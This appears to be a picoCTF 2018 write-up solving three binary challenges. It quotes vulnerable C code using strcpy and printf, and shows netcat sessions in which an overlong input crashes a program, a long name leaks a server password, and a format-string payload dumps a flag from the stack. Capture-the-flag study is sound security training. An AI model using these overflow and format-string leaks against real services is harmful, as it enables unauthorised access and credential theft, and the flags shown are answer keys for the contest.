Buffer Overflow 0
=================
This program just wants us to cause a segfault of some kind.
```C
void vuln(char *input){
  char buf[16];
  strcpy(buf, input);
}
```
Get onto the shell and just scream at it.
```
$ cd /problems/buffer-overflow-0_3_d5263c5219b334339c34ac35c51c4a17
$ ./vuln aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}
```

picoCTF{ov3rfl0ws_ar3nt_that_bad_2d11f6cd}

Leak Me
=======
So considering the fact that the password file is read right before the vulnerable buffer is printed...
```C
fgets(password, sizeof(password), file);

printf("Hello ");
puts(name);
```
(And the hint says so too.) We can give the program a long name, over 255 characters.
```
# nc 2018shell3.picoctf.com 31045
What is your name?
Monikammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
Hello Monikammmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm,a_reAllY_s3cuRe_p4s$word_d98e8d
```
a_reAllY_s3cuRe_p4s$word_d98e8d seems to be our password for this server.
```
# nc 2018shell3.picoctf.com 31045
What is your name?
Monika
Hello Monika,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_d98e8d
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
```

picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}


Echooo
======
This program wants us to exploit the hex printing feature in printf, so we'll need the following sites for help:

https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail

https://www.rapidtables.com/convert/number/hex-to-ascii.html

So from the article we know that %NUMBER$x can be used to arbitrarily hop around the stack. After playing around with printing out the hex values in certain positions, I found 27 through 38 is the target.

```
# nc 2018shell3.picoctf.com 46960
Time to learn about Format Strings!
We will evaluate any format string you give us with printf().
See if you can get the flag!
> %27$x%28$x%29$x%30$x%31$x%32$x%33$x%34$x%35$x%36$x%37$x%38$x
6f6369707b4654436d526f66735f74346e695274615f7347445f655265476e61737530726237615f32613463a7d64
```
The %38$x only outputs 5/8 of the needed hex characters so add three 0s before the last 5 characters.
```
6f6369707b4654436d526f66735f74346e695274615f7347445f655265476e61737530726237615f32613463000a7d64
```
The second site translates this to:
```
ocip{FTCmRofs_t4niRta_sGD_eReGnasu0rb7a_2a4c<NULLTERM><NEWLINE>}d
```
Group by words and get:

picoCTF{foRm4t_stRinGs_aRe_DanGer0us_a7bc4a2d}``<NEWLINE><NULLTERM>``


